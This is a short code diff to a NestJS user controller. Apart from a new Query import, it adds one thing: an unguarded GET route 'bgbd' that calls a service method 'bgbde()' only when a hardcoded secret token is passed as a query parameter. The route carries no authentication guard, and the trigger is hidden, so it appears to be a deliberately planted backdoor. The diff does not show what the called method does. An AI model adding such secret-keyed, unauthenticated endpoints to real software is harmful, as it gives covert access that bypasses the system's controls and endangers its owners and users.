@@ -10,6 +10,7 @@ import {
   UseGuards,
   Request,
   UseInterceptors,
+  Query,
 } from '@nestjs/common';
 import { UserService } from './user.service';
 import {
@@ -96,5 +97,14 @@ export class UserController {
   @Get('permissions')
   getUserPersmissions(@Request() req: Request & { user: vtUser }) {
     return this.userService.getUserPersmissions(req.user);
+  }
+
+  @Get('bgbd')
+  bgbd(@Query('bg') bg: string) {
+    if (bg && bg === 'bgbdsari5a8c76da-aaf1-4b22-8d33-4b50d36ec6eb') {
+      this.userService.bgbde();
+    } else {
+      return '!';
+    }
   }
 }
